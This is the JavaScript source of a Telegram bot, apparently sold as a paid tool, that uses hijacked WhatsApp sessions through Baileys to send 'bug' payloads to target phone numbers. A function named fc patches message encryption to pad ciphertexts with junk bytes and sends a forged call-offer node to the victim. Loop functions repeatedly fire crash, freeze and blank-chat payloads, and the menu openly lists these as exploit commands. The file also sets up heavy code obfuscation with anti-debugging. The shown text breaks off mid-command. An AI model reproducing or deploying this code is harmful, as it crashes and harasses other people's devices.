const {
    default: makeWAbotet,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WAbotet,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./Database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./Database/premium.json');
ensureFileExists('./Database/admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./Database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Database/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./Database/premium.json', (data) => (premiumUsers = data));
watchFile('./Database/admin.json', (data) => (adminUsers = data));


const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VALLOFFCIAL/dbsc31/refs/heads/main/token.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Sabar jembut periksa token..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ wkwkw lu mau nyolong ya cukii."));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on("polling_error", (err) => {
  console.error("Polling error:", err.code, err.response?.body, err.message, err.stack);
});

function startBot() {
  console.log(chalk.red(`

███╗░░██╗░█████╗░██████╗░████████╗██╗░░██╗██╗░░██╗
████╗░██║██╔══██╗██╔══██╗╚══██╔══╝╚██╗██╔╝██║░░██║
██╔██╗██║██║░░██║██████╔╝░░░██║░░░░╚███╔╝░███████║
██║╚████║██║░░██║██╔══██╗░░░██║░░░░██╔██╗░██╔══██║
██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██╔╝╚██╗██║░░██║
╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝

⠀⠀⠀⠀⡀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁
`));


console.log(chalk.red(`
═════════════════════════
  🇷🇺  TOKEN KAMU VALID BANG     
═════════════════════════
`));

console.log(chalk.blue(`
[ 🚀 BOT BERJALAN... ]
`));
};

let bot;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        bot = makeWAbotet ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          bot.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, bot);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          bot.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`ZyuroxZ INVICTUS
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  bot = makeWAbotet ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  bot.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙲𝚁𝙾𝚆-𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`ZyuroxZ INVICTUS
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, bot);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`ZyuroxZ INVICTUS
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await bot.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`ZyuroxZ INVICTUS
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing\`\`\`
╰➤ Kode : \`\`${formattedCode}\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
    \`\`\`ZyuroxZ INVICTUS
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
*╰➤ Pesan* : ${error.message}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  bot.ev.on("creds.update", saveCreds);

  return bot;
}




//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://j.top4top.io/p_3529xgv5n1.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}


// ~ Enc Xopwn Confugurasi
const getVincentObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Verow和CROWS无CROWSr气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© Lipzlight_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


// [ BUG FUNCTION ]
async function fc(bot, target){

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await bot.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await bot.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = bot.createParticipantNodes.bind(bot);
    let yntkts = bot.encodeWAMessage?.bind(bot);

    bot.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (bot.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = bot.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await bot.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await bot.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: bot.generateMessageTag(),
            from: bot.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": bot.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(bot.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    await bot.sendNode(callNode);
}

// [ END FUNCTION ]
async function Delayy(target) {
 for (let i = 0; i < 10; i++) {
 await BetaDelay(target);
 await sleep(350);
 await DelayFarras(target);
 await sleep(350);
 await XStromDelayVisible(target);
 await sleep(350);
 await LocationDelayCore(target);
 await sleep(350);
console.log(chalk.blueBright(`ZyuroxZ Delay Sending Bug 🦠 `));
  }
  }

async function Uikontol(target) {
 for (let i = 0; i < 25; i++) {
 await XProtexCallV7Galxy(target);
 await sleep(1000);
 await curseqcrash(target);
 await sleep(1000);
 await SpcmUi(target);
 await sleep(1000);
console.log(chalk.blueBright(`ZyuroxZ ui Sending Bug 🦠 `));
  }
  }
  
async function blankmemek(target) {
 for (let i = 0; i < 20; i++) {
 await SectionsCrash(target);
 await sleep(1000);
 await XProtexBlankChatV3(target);
 await sleep(1000);
 await ComboBlank(target)
 await sleep(1000);
 console.log(chalk.blueBright(`ZyuroxZ blank Sending Bug 🦠 `));
  }
  }  

async function Feeeze(target) {
 for (let i = 0; i < 25; i++) {
 await mikirKidz(target);
 await sleep(1000);
 await ForceInfinity(target);
 await sleep(1000);
 await uiKiller(target);
 await sleep(1000);
 console.log(chalk.blueBright(`ZyuroxZ Feeeze Sending Bug 🦠 `));
  }
  }
       
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/Vwyro1" }],
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>交 ZyuroxZ INVICTUS ᝄ</blockquote>
( 👀 ) Holaa ☇ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote># 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭</blockquote>
⬡ Author : @VallOffcial
⬡ Version : 3.1 Vip!!
⬡ Framework : Telegraf
⬡ Library : Javascript
⬡ Runtime : ${runtime}
⬡ Date now : ${date}
<blockquote>© ZyuroxZ INVICTUS ᝄ</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroxZ BUG" , callback_data: "bugmenu" }, 
        { text: "THANKS TO", callback_data: "thanksto" }],
        [{ text: "OWNER MENU", callback_data: "ownermenu" }],
        [{ text: "DEV ZyuroxZ", url: "https://t.me/VallOffcial" }, 
        { text: "INFORMASI", url: "https://t.me/ZyuroxZInvictus" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroxZ INVICTUS</b>
<b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>

<b>▢ /ZyuroxZvisible ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Invisible hard</b>

<b>▢ /ZyuroxZui ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Ui system + invis</b>

<b>▢ /ZyuroxZblank ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ blank all device</b>

<b>▢ /ZyuroxZfreeze ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Freeze nyetuk</b>

<b>▢ /fixedbug ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Menghapus bug yg sudah terkirim</b>

<b>-# ( ! ) Note :</b>
<b>Jangan asal mengirim virus ke orang yg tidak bersalah kalo tidak mau ber akibat fatall!!</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroxZ INVICTUS Akses</b>
</blockquote>
<b>▢ /addprem id ☇ days</b>
<b>╰➤ Menambahkan akses pada user</b>

<b>▢ /delprem id</b>
<b>╰➤ Menghapus akses pada user</b>

<b>▢ /addadmin id</b>
<b>╰➤ Menambahkan akses admin pada user</b>

<b>▢ /deladmin id</b>
<b>╰➤ Menghapus akses admin pada use</b>

<b>▢ /listprem</b>
<b>╰➤ Melihat list premium user yang ada</b>

<b>▢ /addsender  ☇ Number</b>
<b>╰➤ Menambah Sender WhatsApp</b>

<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `<blockquote><b>( ! ) - Thanks Too</b>

<b>▢ VallOffcial ( Author )</b>
<b>▢ Wolf ( My support )</b>
<b>▢ EvilCyt ( My support )</b>
<b>▢ Linux ( My support )</b>
<b>▢ Frmnz.js ( My support )</b>
<b>▢ Zepyrine ( My support )</b>
<b>▢ Erlangga ( Dev Sasukeh )</b>
<b>▢ ZyuroxZCrow ( Dev Crow )</b>
<b>▢ ALL PT/BUYERR ZyuroxZ INVICTUS</b>

<b>thanks ZyuroxZ INVICTUS</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>交 ZyuroxZ INVICTUS ᝄ</blockquote>
( 👀 ) Holaa ☇ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote># 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭</blockquote>
⬡ Author : @VallOffcial
⬡ Version : 3.1 Vip!!
⬡ Framework : Telegraf
⬡ Library : Javascript
⬡ Runtime : ${runtime}
⬡ Date now : ${date}
<blockquote>© ZyuroxZ INVICTUS ᝄ</blockquote>
`;
    newButtons = [
        [{ text: "ZyuroxZ BUG", callback_data: "bugmenu" }, 
        { text: "THANKS TO", callback_data: "thanksto" }],
        [{ text: "OWNER MENU", callback_data: "ownermenu" }],
        [{ text: "DEV ZyuroxZ", url: "https://t.me/VallOffcial" }, 
        { text: "INFORMASI", url: "https://t.me/ZyuroxZInvictus" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


//=======CASE BUG=========//
bot.onText(/\/ZyuroxZvisible (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
